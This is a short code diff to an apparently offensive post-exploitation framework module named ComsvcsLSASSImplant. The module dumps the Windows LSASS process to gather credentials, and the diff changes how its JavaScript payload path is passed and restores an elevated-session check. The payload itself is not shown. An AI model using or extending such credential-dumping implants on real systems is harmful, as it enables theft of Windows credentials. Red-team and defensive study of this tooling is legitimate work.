@@ -22,17 +22,18 @@ class ComsvcsLSASSImplant(core.implant.Implant):
         return ComsvcsLSASSJob
 
     def run(self):
-
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/gather/comsvcs_lsass.js", self.options)
+        payloads["js"] = "data/implant/gather/comsvcs_lsass.js"
         self.dispatch(payloads, self.job)
 
 class ComsvcsLSASSJob(core.job.Job):
     def create(self):
         self.katz_output = ""
-        # if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
-        #     self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
-        #     return False
+        if self.session_id == -1:
+            return
+        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
+            self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
+            return False
 
     def report(self, handler, data, sanitize = False):
 
